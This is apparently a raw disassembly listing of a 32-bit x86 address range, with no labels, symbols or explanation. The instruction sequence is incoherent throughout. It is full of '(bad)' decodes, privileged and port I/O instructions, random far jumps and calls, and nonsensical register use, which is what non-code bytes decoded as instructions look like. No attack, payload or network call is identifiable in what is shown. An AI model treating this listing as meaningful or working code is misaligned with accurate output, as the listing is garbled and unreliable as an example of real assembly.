  419c23:	xor    ah,BYTE PTR [esi+0x6a]
  419c26:	stos   DWORD PTR es:[edi],eax
  419c27:	js     0x419c82
  419c29:	cld    
  419c2a:	pop    ds
  419c2b:	inc    edi
  419c2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c2d:	imul   esp,DWORD PTR [edx],0x4b
  419c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c31:	lods   al,BYTE PTR ds:[esi]
  419c32:	pop    ecx
  419c33:	and    eax,0xe652b949
  419c38:	mov    DWORD PTR [edi-0x16c42f82],esp
  419c3e:	push   esp
  419c3f:	jecxz  0x419cac
  419c41:	inc    ebp
  419c42:	fist   WORD PTR [ebx-0x1738427f]
  419c48:	xchg   ebx,eax
  419c49:	jmp    0xc0d991f2
  419c4e:	sbb    ah,ch
  419c50:	ret    
  419c51:	jl     0x419c13
  419c53:	xchg   esi,eax
  419c54:	mov    eax,ds:0xe7fe704c
  419c59:	call   0x8922:0xf8d6a081
  419c60:	aaa    
  419c61:	aad    0x1b
  419c63:	ja     0x419bfa
  419c65:	mov    dh,0x97
  419c67:	cmp    dl,cl
  419c69:	cli    
  419c6a:	test   eax,0x209375c2
  419c6f:	rcl    DWORD PTR [ebx+ebp*1+0x4cb808e0],0x65
  419c77:	std    
  419c78:	mov    al,ds:0x788b2315
  419c7d:	add    al,0x54
  419c7f:	mov    bl,0x31
  419c81:	pop    ds
  419c82:	jo     0x419cf2
  419c84:	stos   DWORD PTR es:[edi],eax
  419c85:	cld    
  419c86:	xchg   ebx,eax
  419c87:	jp     0x419c62
  419c89:	test   DWORD PTR [esp+eax*4],esi
  419c8c:	icebp  
  419c8d:	add    eax,DWORD PTR [ebx-0x7c82dec0]
  419c93:	stos   DWORD PTR es:[edi],eax
  419c94:	mov    edi,0x478686a9
  419c99:	mov    esp,0x6a240b9c
  419c9e:	bound  edx,QWORD PTR [eax]
  419ca0:	push   esp
  419ca1:	leave  
  419ca2:	push   0xb23fceb6
  419ca7:	dec    ebx
  419ca8:	dec    esp
  419ca9:	xor    ebx,DWORD PTR [eax+0x3abc3c08]
  419caf:	ficom  WORD PTR [esp+ebp*4-0x58]
  419cb3:	iret   
  419cb4:	shl    DWORD PTR [ecx+0x1e],cl
  419cb7:	ins    BYTE PTR es:[edi],dx
  419cb8:	jbe    0x419c58
  419cba:	mov    dh,0xc
  419cbc:	sbb    DWORD PTR [ebx-0x66],edi
  419cbf:	leave  
  419cc0:	test   dl,0xef
  419cc3:	push   es
  419cc4:	adc    DWORD PTR [edi-0x32],ecx
  419cc7:	jmp    0x49e4:0xb9d7296d
  419cce:	test   al,0x2c
  419cd0:	test   al,al
  419cd2:	lods   al,BYTE PTR ds:[esi]
  419cd3:	icebp  
  419cd4:	mov    edx,0x6ca1a382
  419cd9:	ret    
  419cda:	repz cdq 
  419cdc:	aam    0x2a
  419cde:	imul   eax,DWORD PTR [ecx],0xffffff86
  419ce1:	enter  0x6863,0x53
  419ce5:	std    
  419ce6:	sbb    eax,0xbfa1b34a
  419ceb:	jmp    0x419ca3
  419ced:	stos   DWORD PTR es:[edi],eax
  419cee:	mov    eax,ds:0x226304b0
  419cf3:	mov    esi,0x4ee22892
  419cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cf9:	mov    ah,ch
  419cfb:	push   0x6b
  419cfd:	jmp    0x419d07
  419cff:	inc    esp
  419d00:	ret    
  419d01:	add    eax,0xd7de7ba3
  419d06:	or     bh,cl
  419d08:	ret    0xd66f
  419d0b:	fninit 
  419d0d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d0f:	xchg   ebx,esi
  419d11:	add    eax,0x5050d5a3
  419d16:	popa   
  419d17:	rcl    DWORD PTR [esi],0x6d
  419d1a:	retf   0x3582
  419d1d:	sar    DWORD PTR [ebp+0x6a],cl
  419d20:	mov    ds:0x35c7f6a,eax
  419d25:	jp     0x419d93
  419d27:	pop    ebx
  419d28:	ror    DWORD PTR [eax-0x48],cl
  419d2b:	scas   eax,DWORD PTR es:[edi]
  419d2c:	arpl   WORD PTR [ebp+0x62ec4d5],cx
  419d32:	sub    ah,BYTE PTR [ecx+0x372eb85a]
  419d38:	mov    ebp,DWORD PTR ds:0x7a126f18
  419d3e:	cdq    
  419d3f:	or     dl,BYTE PTR ds:0xda291105
  419d45:	popf   
  419d46:	jbe    0x419d39
  419d48:	pushf  
  419d49:	or     eax,0xff005d9e
  419d4e:	push   edx
  419d4f:	fwait
  419d50:	loopne 0x419cff
  419d52:	pop    ss
  419d53:	jl     0x419dba
  419d55:	sub    al,0xbf
  419d57:	mov    ecx,0x32ba848e
  419d5c:	xchg   BYTE PTR [edi+0x67],bl
  419d5f:	clc    
  419d60:	pushf  
  419d61:	ficom  WORD PTR [esp+ebp*4]
  419d64:	loopne 0x419de5
  419d66:	aam    0xdb
  419d68:	sub    al,0xc
  419d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d6b:	mul    DWORD PTR [ebp-0x28ef6173]
  419d71:	cmp    esi,DWORD PTR es:[ecx]
  419d74:	ja     0x419d3b
  419d76:	mov    ds:0x7c8a3b8e,eax
  419d7b:	xchg   ebx,eax
  419d7c:	sbb    DWORD PTR ds:0xb7475f9b,eax
  419d82:	scas   eax,DWORD PTR es:[edi]
  419d83:	ret    
  419d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d85:	ret    
  419d86:	int    0xd0
  419d88:	das    
  419d89:	or     esi,edx
  419d8b:	mov    esp,0xc99d377b
  419d90:	jecxz  0x419d85
  419d92:	push   esi
  419d93:	in     al,dx
  419d94:	nop
  419d95:	cmc    
  419d96:	fcmovb st,st(0)
  419d98:	sbb    bh,cl
  419d9a:	add    eax,0x629e0b23
  419d9f:	not    BYTE PTR [edx+0xf]
  419da2:	jp     0x419dfc
  419da4:	jo     0x419dd9
  419da6:	test   BYTE PTR [ebx-0x5834b536],0xd2
  419dad:	inc    edx
  419dae:	xchg   esi,eax
  419daf:	call   0xd397:0x7e441743
  419db6:	mov    esp,0x35256b13
  419dbb:	xor    DWORD PTR [eax+ebx*1+0x1c],ebp
  419dbf:	int3   
  419dc0:	stos   BYTE PTR es:[edi],al
  419dc1:	popf   
  419dc2:	inc    esi
  419dc3:	(bad)  
  419dc5:	js     0x419e20
  419dc7:	scas   al,BYTE PTR es:[edi]
  419dc8:	jns    0x419def
  419dca:	sbb    eax,0xd83d77b0
  419dcf:	mov    edx,ss
  419dd1:	stos   BYTE PTR es:[edi],al
  419dd2:	push   es
  419dd3:	ret    0x197a
  419dd6:	push   0x1c
  419dd8:	cld    
  419dd9:	mov    esi,0xe7c56b0
  419dde:	jae    0x419e4e
  419de0:	lock xor edx,DWORD PTR [edi-0x29]
  419de4:	xlat   BYTE PTR ds:[ebx]
  419de5:	aad    0xc4
  419de7:	mov    ecx,DWORD PTR [ebx-0x1d2860f8]
  419ded:	sahf   
  419dee:	push   0x37
  419df0:	jl     0x419df5
  419df2:	or     al,0xdc
  419df4:	and    al,0xcf
  419df6:	mov    ecx,0x4f843aff
  419dfb:	imul   ebx,edi,0x6f
  419dfe:	sub    cl,BYTE PTR [eax+0x632f5e41]
  419e04:	push   0x2126c12c
  419e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e0a:	popa   
  419e0b:	xchg   esp,eax
  419e0c:	lea    esp,[eax-0x57]
  419e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e10:	jne    0x419e17
  419e12:	sti    
  419e13:	fistp  DWORD PTR [ecx]
  419e15:	push   cs
  419e16:	lods   al,BYTE PTR ds:[esi]
  419e17:	add    DWORD PTR ds:0xba7f7313,0x58d8d5e4
  419e21:	idiv   DWORD PTR [eax-0x401ee557]
  419e27:	in     eax,0x35
  419e29:	xchg   edi,eax
  419e2a:	xor    al,0x56
  419e2c:	repz out dx,eax
  419e2e:	xor    BYTE PTR [ebp+edi*8+0x57],ah
  419e32:	mov    edx,0x6877a4be
  419e37:	or     eax,0xa4aa6080
  419e3c:	pop    edx
  419e3d:	cmp    DWORD PTR [ecx+0x50],eax
  419e40:	aam    0x53
  419e42:	xor    cl,ch
  419e44:	shr    BYTE PTR [edx+0x7d],0x11
  419e48:	sbb    eax,0x79a83000
  419e4d:	inc    esp
  419e4e:	mov    ch,0x1b
  419e50:	dec    edx
  419e51:	enter  0x97b2,0xe5
  419e55:	outs   dx,BYTE PTR ds:[esi]
  419e56:	(bad)  
  419e57:	jl     0x419ea4
  419e59:	out    dx,eax
  419e5a:	lods   eax,DWORD PTR ds:[esi]
  419e5b:	dec    ebx
  419e5c:	in     eax,0xca
  419e5e:	push   esi
  419e5f:	jmp    0x4af378a
  419e64:	call   0x34efa3ef
  419e69:	pop    es
  419e6a:	rol    ch,1
  419e6c:	sub    eax,0x24132110
  419e71:	dec    ebp
  419e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e73:	pop    esp
  419e74:	fnstcw WORD PTR ds:0x5b5d32bf
  419e7a:	jo     0x419e1f
  419e7c:	mov    dh,bh
  419e7e:	sbb    eax,0x606cb527
  419e83:	push   esp
  419e84:	lahf   
  419e85:	loop   0x419e64
  419e87:	ja     0x419ec0
  419e89:	out    0xa1,eax
  419e8b:	arpl   WORD PTR [esi+0x256f5795],cx
  419e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e92:	and    ebp,DWORD PTR [edx+0x1525d425]
  419e98:	adc    eax,0xb3584edb
  419e9d:	sbb    al,0x8c
  419e9f:	add    eax,0xf54aff38
  419ea4:	call   edi
  419ea6:	jno    0x419ee2
  419ea8:	push   esi
  419ea9:	repnz retf 
  419eab:	shr    al,1
  419ead:	and    ecx,DWORD PTR ds:0x72aef8be
  419eb3:	aas    
  419eb4:	hlt    
  419eb5:	hlt    
  419eb6:	pop    esi
  419eb7:	xor    bl,BYTE PTR [edx+0x639791f9]
  419ebd:	mov    dl,bh
  419ebf:	mov    edi,0x6de64645
  419ec4:	mov    ?,WORD PTR [ebp-0xf]
  419ec7:	addr16 sbb bl,ch
  419eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ecb:	test   al,0x0
  419ecd:	ds and al,0x5a
  419ed0:	mov    gs,WORD PTR [ecx]
  419ed2:	rol    ah,cl
  419ed4:	and    al,0x31
  419ed6:	cli    
  419ed7:	(bad)  
  419ed8:	mov    al,0xe7
  419eda:	mov    edi,0x2a046b79
  419edf:	add    ebx,DWORD PTR [ebx+eiz*1-0x6b]
  419ee3:	cmp    BYTE PTR [edi],ah
  419ee5:	inc    ebx
  419ee6:	inc    ebp
  419ee7:	xchg   DWORD PTR [edi+0x21],esi
  419eea:	and    BYTE PTR [ebx-0x4aa0ba4b],0xf6
  419ef1:	es pop eax
  419ef3:	stos   BYTE PTR es:[edi],al
  419ef4:	xchg   ecx,eax
  419ef5:	mov    ch,0xc4
  419ef7:	mov    ebp,0xc4c3dfe4
  419efc:	mov    bh,0xc7
  419efe:	mov    ecx,0x5b2688ab
  419f03:	shr    BYTE PTR [edi],1
  419f05:	and    DWORD PTR [edi-0x3],ebx
  419f08:	or     DWORD PTR [ebx],ebx
  419f0a:	fcmovb st,st(7)
  419f0c:	inc    ebx
  419f0d:	mov    eax,ds:0x85960b58
  419f12:	arpl   WORD PTR [eax+ebx*4-0x124d6043],dx
  419f19:	out    0x3a,al
  419f1b:	jns    0x419f38
  419f1d:	lahf   
  419f1e:	aaa    
  419f1f:	push   0xffffffa0
  419f21:	jne    0x419f4d
  419f23:	(bad)  [edx+ebx*8]
  419f26:	int    0x5d
  419f28:	clc    
  419f29:	add    BYTE PTR ds:0x179f76a3,bh
  419f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f30:	add    al,bh
  419f32:	lods   al,BYTE PTR ds:[esi]
  419f33:	dec    ecx
  419f34:	mov    ebx,0xbf6ba41f
  419f39:	pop    eax
  419f3a:	jle    0x419ed1
  419f3c:	pop    ebp
  419f3d:	in     al,0x5b
  419f3f:	mov    eax,es
  419f41:	mov    BYTE PTR [edi-0x72fb711d],0x79
  419f48:	fisttp WORD PTR [edi-0x4a02ee2e]
  419f4e:	neg    DWORD PTR [edi-0x17771f2c]
  419f54:	fstp   DWORD PTR [edx+0x2dd4470f]
  419f5a:	loopne 0x419f37
  419f5c:	xchg   edx,eax
  419f5d:	sub    ebp,DWORD PTR [esi]
  419f5f:	push   ecx
  419f60:	or     edx,ecx
  419f62:	pop    eax
  419f63:	push   ebx
  419f64:	push   cs
  419f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f66:	push   edi
  419f67:	std    
  419f68:	test   BYTE PTR [edx+0x47],0x33
  419f6c:	sbb    al,0xac
  419f6e:	dec    edi
  419f6f:	push   edi
  419f70:	outs   dx,DWORD PTR ds:[esi]
  419f71:	push   0x46
  419f73:	lock mov al,0x68
  419f76:	dec    esp
  419f77:	xchg   ecx,eax
  419f78:	mov    WORD PTR [eax],?
  419f7a:	jg     0x419fab
  419f7c:	xchg   BYTE PTR [ecx+eiz*1],bh
  419f7f:	ds popa 
  419f81:	cmp    DWORD PTR [eax],0x5e
  419f84:	push   ss
  419f85:	jle    0x419f20
  419f87:	pop    esi
  419f88:	dec    ebx
  419f89:	sub    al,0xe7
  419f8b:	lods   al,BYTE PTR ds:[esi]
  419f8c:	lock and DWORD PTR [ebp+0x77aa063b],0xfffffffd
  419f94:	out    dx,al
  419f95:	jmp    0x84de:0xace71f64
  419f9c:	dec    edx
  419f9d:	ret    0x304a
  419fa0:	mov    ebp,0x5901a4bb
  419fa5:	sub    al,0x51
  419fa7:	es shl dh,0x7e
  419fab:	mov    ecx,ds
  419fad:	aam    0xf
  419faf:	data16 sub al,0xc8
  419fb2:	stos   BYTE PTR es:[edi],al
  419fb3:	push   ebx
  419fb4:	je     0x419fc9
  419fb6:	stos   DWORD PTR es:[edi],eax
  419fb7:	into   
  419fb8:	dec    ecx
  419fb9:	ja     0x41a02b
  419fbb:	adc    ebp,esi
  419fbd:	add    eax,0x6c245be0
  419fc2:	or     DWORD PTR [esp+eax*1-0x75f2ce94],ebx
  419fc9:	clc    
  419fca:	jl     0x419f79
  419fcc:	pop    ss
  419fcd:	jns    0x419fbf
  419fcf:	jne    0x419fb1
  419fd1:	pop    es
  419fd2:	out    dx,eax
  419fd3:	adc    esi,DWORD PTR [esi]
  419fd5:	outs   dx,BYTE PTR ds:[esi]
  419fd6:	(bad)  
  419fd7:	and    al,0xb4
  419fd9:	sub    esi,DWORD PTR [esi]
  419fdb:	dec    edx
  419fdc:	das    
  419fdd:	sbb    ebp,edi
  419fdf:	sub    BYTE PTR [eax],ch
  419fe1:	or     ebx,ebp
  419fe3:	mov    ah,0xc3
  419fe5:	xchg   esp,eax
  419fe6:	cmc    
  419fe7:	std    
  419fe8:	sub    al,0x8c
  419fea:	ja     0x419fc3
  419fec:	add    DWORD PTR [esi],ebx
  419fee:	jp     0x41a003
  419ff0:	cmp    eax,DWORD PTR [ebx]
  419ff2:	cmp    DWORD PTR [eax+eax*1-0x3a644afc],0xebe3d7ae
  419ffd:	ret    
  419ffe:	dec    edx
  419fff:	and    ah,BYTE PTR [esi]
  41a001:	jnp    0x419ff8
  41a003:	push   ss
  41a004:	popf   
  41a005:	jecxz  0x419ff4
  41a007:	jnp    0x41a02c
  41a009:	mov    dl,0x60
  41a00b:	sbb    DWORD PTR [edx-0x77],esi
  41a00e:	sbb    DWORD PTR [esi-0x17],0xffffffb4
  41a012:	add    edi,DWORD PTR es:[eax-0x25]
  41a016:	adc    eax,0x41200cbe
  41a01b:	dec    edi
  41a01c:	or     al,0xa9
  41a01e:	mov    al,0x4f
  41a020:	mov    dl,0x93
  41a022:	xlat   BYTE PTR ds:[ebx]
  41a023:	jne    0x41a07a
  41a025:	in     eax,0x2f
  41a027:	mov    ch,0x20
  41a029:	mov    dl,0x6d
  41a02b:	pop    ebp
  41a02c:	int3   
  41a02d:	jb     0x41a033
  41a02f:	pop    eax
  41a030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a031:	loop   0x419fb5
  41a033:	iret   
  41a034:	push   ds
  41a035:	clc    
  41a036:	fs into 
  41a038:	dec    edi
  41a039:	test   BYTE PTR [esp+ecx*4],cl
  41a03c:	jge    0x41a089
  41a03e:	ret    0x12be
  41a041:	mov    ecx,0x217f996b
  41a046:	jmp    0x41a0a5
  41a048:	pop    ds
  41a049:	and    eax,DWORD PTR [ebx+0x5e]
  41a04c:	or     cl,BYTE PTR [ebp-0x47a3934f]
  41a052:	sub    DWORD PTR [ebx-0x1d5e137b],edx
  41a058:	and    esp,edi
  41a05a:	dec    edx
  41a05b:	gs adc al,0x1e
  41a05e:	xor    DWORD PTR [edi],ecx
  41a060:	xchg   esp,eax
  41a061:	push   ebx
  41a062:	jp     0x41a040
  41a064:	test   al,0xb2
  41a066:	fucomi st,st(0)
  41a068:	push   0x46
  41a06a:	xor    DWORD PTR [ebp-0x6e],edi
  41a06d:	ds addr16 jno 0x41a09b
  41a071:	fisttp WORD PTR [ebp-0x3e5298c4]
  41a077:	or     al,0xf8
  41a079:	call   0x75d9:0x4c186e9c
  41a080:	pop    ss
  41a081:	xor    BYTE PTR [eax-0x719103d2],cl
  41a087:	jae    0x41a0be
  41a089:	sub    ebx,esp
  41a08b:	dec    eax
  41a08c:	jecxz  0x41a0ee
  41a08e:	mov    eax,0xbf652ec
  41a093:	jno    0x41a098
  41a095:	lds    eax,FWORD PTR es:[eax+edx*8+0x18]
  41a09a:	xchg   edx,eax
  41a09b:	jp     0x41a042
  41a09d:	lahf   
  41a09e:	call   0x5164:0x8a95f692
  41a0a5:	js     0x41a0b5
  41a0a7:	stc    
  41a0a8:	popf   
  41a0a9:	and    al,0x59
  41a0ab:	adc    ebx,DWORD PTR [edi+0x6]
  41a0ae:	cmp    al,0xad
  41a0b0:	lds    esp,FWORD PTR ds:0x918c82f4
  41a0b6:	aas    
  41a0b7:	ds sahf 
  41a0b9:	xor    DWORD PTR [ebx],eax
  41a0bb:	adc    bl,BYTE PTR gs:[ebp-0x2]
  41a0bf:	and    esp,0x96f7cad9
  41a0c5:	aam    0x58
  41a0c7:	outs   dx,DWORD PTR ds:[esi]
  41a0c8:	ret    
  41a0c9:	sbb    eax,ebx
  41a0cb:	stc    
  41a0cc:	jns    0x41a0b4
  41a0ce:	rcr    DWORD PTR [esi+0x695e6234],1
  41a0d4:	(bad)  
  41a0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0d6:	sub    BYTE PTR [bp+di],al
  41a0d9:	bound  ebx,QWORD PTR [edi]
  41a0db:	xchg   ebp,eax
  41a0dc:	jns    0x41a12f
  41a0de:	nop
  41a0df:	loope  0x41a0d6
  41a0e1:	out    dx,eax
  41a0e2:	push   ebx
  41a0e3:	jo     0x41a132
  41a0e5:	(bad)  [esi]
  41a0e7:	cmp    al,BYTE PTR [ecx+0x5d39d5e3]
  41a0ed:	mov    dl,0x44
  41a0ef:	mov    bh,dl
  41a0f1:	and    eax,0xe5f331f6
  41a0f6:	es add eax,ecx
  41a0f9:	pop    esi
  41a0fa:	in     al,dx
  41a0fb:	push   edi
  41a0fc:	sahf   
  41a0fd:	cwde   
  41a0fe:	mov    ah,0x81
  41a100:	fbld   TBYTE PTR [esi-0x4676ea96]
  41a106:	sbb    al,0xff
  41a108:	jmp    0x41a0bc
  41a10a:	inc    edi
  41a10b:	out    dx,eax
  41a10c:	pop    esp
  41a10d:	icebp  
  41a10e:	ds ins BYTE PTR es:[edi],dx
  41a110:	lds    ecx,FWORD PTR [esi]
  41a112:	je     0x41a102
  41a114:	sub    bh,bh
  41a116:	xchg   BYTE PTR [ebx-0x52],bh
  41a119:	fwait
  41a11a:	(bad)  
  41a11b:	cli    
  41a11c:	mov    ds:0x5656c63f,eax
  41a121:	dec    ebx
  41a122:	dec    eax
  41a123:	dec    esi
  41a124:	cld    
  41a125:	sbb    al,0x1e
  41a127:	aam    0x63
  41a129:	sub    al,0x3b
  41a12b:	and    DWORD PTR [edx-0x6c],ebp
  41a12e:	enter  0xee0c,0x72
  41a132:	sbb    eax,0x560502de
  41a137:	lods   al,BYTE PTR ds:[esi]
  41a138:	inc    ebx
  41a139:	out    dx,al
  41a13a:	repnz cmc 
  41a13c:	adc    eax,0x9c8d2ec2
  41a141:	call   0xba8e04df
  41a146:	pop    ecx
  41a147:	retf   0x13bb
  41a14a:	popa   
  41a14b:	xchg   ebx,eax
  41a14c:	cwde   
  41a14d:	int3   
  41a14e:	(bad)  
  41a150:	xchg   ecx,eax
  41a151:	inc    ecx
  41a152:	hlt    
  41a153:	mov    ah,0x89
  41a155:	not    DWORD PTR [esi]
  41a157:	pop    ds
  41a158:	dec    ebx
  41a159:	push   esp
  41a15a:	retf   0xcec
  41a15d:	mov    ebp,0x949f5457
  41a162:	cmp    DWORD PTR [ecx-0x1b54741f],eax
  41a168:	fild   QWORD PTR [bp+di-0x6595]
  41a16d:	mov    ds:0x31b21862,al
  41a172:	jmp    0x6e34:0x754d163b
  41a179:	xor    ecx,esi
  41a17b:	ds sub ch,bh
  41a17e:	mov    ch,0x9a
  41a180:	ds jmp 0xd6160
  41a186:	mov    bh,0x97
  41a188:	adc    eax,0x47fa9e79
  41a18d:	popf   
  41a18e:	es or  bh,dl
  41a191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a192:	and    al,0xa1
  41a194:	(bad)  
  41a195:	fcomp  st(2)
  41a197:	jb     0x41a1e1
  41a199:	jge    0x41a1a4
  41a19b:	jne    0x41a1c2
  41a19d:	cdq    
  41a19e:	fs ss add al,0x32
  41a1a2:	lock out 0xd9,eax
  41a1a5:	repz data16 fist DWORD PTR [esi]
  41a1a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1aa:	inc    ebp
  41a1ab:	(bad)  
  41a1ac:	fwait
  41a1ad:	in     al,0x5a
  41a1af:	icebp  
  41a1b0:	call   0x5343:0xf51009fc
  41a1b7:	push   edi
  41a1b8:	pushf  
  41a1b9:	xor    ch,dl
  41a1bb:	lahf   
  41a1bc:	mov    ds:0x41cc7d19,eax
  41a1c1:	mov    bl,0xce
  41a1c3:	cmp    al,0x0
  41a1c5:	not    ah
  41a1c7:	mov    ds:0xf36ac6db,eax
  41a1cc:	inc    esp
  41a1cd:	xchg   ecx,eax
  41a1ce:	jae    0x41a1ed
  41a1d0:	aas    
  41a1d1:	pusha  
  41a1d2:	fst    QWORD PTR [edi]
  41a1d4:	push   cs
  41a1d5:	push   edi
  41a1d6:	into   
  41a1d7:	pushf  
  41a1d8:	cdq    
  41a1d9:	(bad)  
  41a1da:	or     al,0x9e
  41a1dc:	inc    ebp
  41a1dd:	je     0x41a1f7
  41a1df:	xchg   esi,eax
  41a1e0:	add    DWORD PTR [edi-0x3c82781e],0x3e5bd8f5
  41a1ea:	ds sub al,0x21
  41a1ed:	scas   al,BYTE PTR es:[edi]
  41a1ee:	xchg   edi,eax
  41a1ef:	ficom  DWORD PTR [esi+0x2439fd87]
  41a1f5:	clc    
  41a1f6:	loope  0x41a1ab
  41a1f8:	aas    
  41a1f9:	(bad)  
  41a1fa:	jbe    0x41a1a1
  41a1fc:	js     0x41a1ef
  41a1fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ff:	daa    
  41a200:	jg     0x41a234
  41a202:	jge    0x41a221
  41a204:	(bad)  
  41a205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a206:	loopne 0x41a27e
  41a208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a209:	scas   eax,DWORD PTR es:[edi]
  41a20a:	mov    edx,0x5eba0ef2
  41a20f:	stos   BYTE PTR es:[edi],al
  41a210:	inc    ebx
  41a211:	lods   al,BYTE PTR ds:[esi]
  41a212:	int3   
  41a213:	xchg   esi,eax
  41a214:	ins    DWORD PTR es:[edi],dx
  41a215:	jb     0x41a1c7
  41a217:	stos   BYTE PTR es:[edi],al
  41a218:	or     DWORD PTR [esi+ebx*1],edx
  41a21b:	mov    edx,0x3c23d488
  41a220:	and    ebp,edi
  41a222:	aam    0xe4
  41a224:	pop    DWORD PTR [esi]
  41a226:	xor    eax,0x1598c997
  41a22b:	pop    ebp
  41a22c:	push   es
  41a22d:	sar    DWORD PTR [eax-0x18],0x74
  41a231:	add    al,0x45
  41a233:	and    al,0xd2
  41a235:	jo     0x41a238
  41a237:	rcl    esi,cl
  41a239:	icebp  
  41a23a:	inc    ebx
  41a23b:	pop    ds
  41a23c:	cmp    DWORD PTR [edx-0x1f807e59],ecx
  41a242:	dec    eax
  41a243:	sub    eax,0x6d476ccc
  41a248:	sub    al,0x26
  41a24a:	sbb    esi,DWORD PTR [eax]
  41a24c:	outs   dx,DWORD PTR ds:[esi]
  41a24d:	aas    
  41a24e:	dec    ecx
  41a24f:	xchg   ebp,eax
  41a250:	or     eax,0x39f3e091
  41a255:	xchg   BYTE PTR [edx],dh
  41a257:	cmp    al,0x50
  41a259:	pop    eax
  41a25a:	aam    0xfc
  41a25c:	(bad)  
  41a25d:	shl    BYTE PTR [esi-0x38d4598],cl
  41a263:	mov    fs,WORD PTR [eax-0x75]
  41a266:	jle    0x41a2b1
  41a268:	cmp    BYTE PTR [esi-0x65],bl
  41a26b:	out    dx,eax
  41a26c:	and    cl,BYTE PTR ds:0xb679e22d
  41a272:	ret    
  41a273:	lahf   
  41a274:	mov    eax,0x8bbe976e
  41a279:	jns    0x41a2bf
  41a27b:	or     eax,0x5870c72e
  41a280:	or     eax,0x88e14fc1
  41a285:	in     al,dx
  41a286:	inc    eax
  41a287:	shr    DWORD PTR [ebx-0x4b485ee2],0xdf
  41a28e:	mov    al,gs:0xa8f7cab7
  41a294:	(bad)  
  41a295:	jmp    0x1cfcc485
  41a29a:	hlt    
  41a29b:	push   esp
  41a29c:	ins    DWORD PTR es:[edi],dx
  41a29d:	lahf   
  41a29e:	stos   DWORD PTR es:[edi],eax
  41a29f:	pusha  
  41a2a0:	adc    al,0xe7
  41a2a2:	and    BYTE PTR [edx+0x75b452bc],dh
  41a2a8:	add    DWORD PTR [ebx],esi
  41a2aa:	pop    esp
  41a2ab:	in     al,0x6c
  41a2ad:	cmc    
  41a2ae:	mov    bh,0x99
  41a2b0:	jecxz  0x41a32b
  41a2b2:	mov    BYTE PTR [ebx+ebx*8],0x21
  41a2b6:	sti    
  41a2b7:	repnz add esp,DWORD PTR [eax-0x35]
  41a2bb:	std    
  41a2bc:	jb     0x41a2d9
  41a2be:	enter  0x4544,0x5c
  41a2c2:	aaa    
  41a2c3:	xlat   BYTE PTR ds:[ebx]
  41a2c4:	popa   
  41a2c5:	jge    0x41a2dd
  41a2c7:	test   al,0x6a
  41a2c9:	imul   eax,DWORD PTR [esi-0x34],0x42
  41a2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ce:	or     cl,BYTE PTR [edi+0x5b466ac2]
  41a2d4:	xor    bh,BYTE PTR [esi-0x2da20a56]
  41a2da:	or     al,0x7d
  41a2dc:	mov    ebx,DWORD PTR [esi-0x3d]
  41a2df:	(bad)  
  41a2e1:	add    al,0x11
  41a2e3:	lods   eax,DWORD PTR ds:[esi]
  41a2e4:	sbb    dh,BYTE PTR [ebx+0x6a]
  41a2e7:	imul   edx,DWORD PTR [edx+0x53388b02],0x66536cb7
  41a2f1:	fadd   st,st(7)
  41a2f3:	inc    edx
  41a2f4:	inc    ebx
  41a2f5:	xchg   esi,eax
  41a2f6:	aas    
  41a2f7:	std    
  41a2f8:	cld    
  41a2f9:	cmp    dl,BYTE PTR [eax+0x2]
  41a2fc:	es cmp eax,0xa833ef9e
  41a302:	hlt    
  41a303:	mov    edx,0x320be49b
  41a308:	and    al,0x34
  41a30a:	push   eax
  41a30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a30c:	les    esi,FWORD PTR [ebp+0x79]
  41a30f:	dec    ecx
  41a310:	xlat   BYTE PTR ds:[ebx]
  41a311:	jne    0x41a29f
  41a313:	mov    edi,DWORD PTR ds:0xee1ae4ab
  41a319:	ds pop esp
  41a31b:	aaa    
  41a31c:	mov    BYTE PTR [ecx],dh
  41a31e:	dec    esi
  41a31f:	loop   0x41a366
  41a321:	xchg   esp,eax
  41a322:	es out 0x79,eax
  41a325:	and    DWORD PTR [ebp+0x4869eca2],0xffffffe3
  41a32c:	js     0x41a2c1
  41a32e:	inc    edx
  41a32f:	test   eax,0x48788ce9
  41a334:	sbb    DWORD PTR [ebp+0x50806043],edi
  41a33a:	out    0x62,eax
  41a33c:	out    0x20,al
  41a33e:	inc    edi
  41a33f:	retf   
  41a340:	xabort 0xcd
  41a343:	pop    edx
  41a344:	mov    dh,0x42
  41a346:	out    dx,eax
  41a347:	sahf   
  41a348:	push   es
  41a349:	cwde   
  41a34a:	jmp    0x55b8:0x12a9fe9c
  41a351:	jl     0x41a35f
  41a353:	sub    al,0xc2
  41a355:	lds    esp,FWORD PTR [ebp-0x4d719b4f]
  41a35b:	fadd   QWORD PTR [ebp+0x685281a4]
  41a361:	xchg   dl,ch
  41a363:	cmp    ch,BYTE PTR [esi]
  41a365:	or     dh,BYTE PTR [ecx-0x3f8a4f97]
  41a36b:	push   esi
  41a36c:	xchg   esp,eax
  41a36d:	xlat   BYTE PTR ds:[ebx]
  41a36e:	jp     0x41a369
  41a370:	pop    ebx
  41a371:	dec    esi
  41a372:	lahf   
  41a373:	dec    ecx
  41a374:	mov    ebp,0xf0cca276
  41a379:	inc    ebp
  41a37a:	ds retf 
  41a37c:	xor    ch,dl
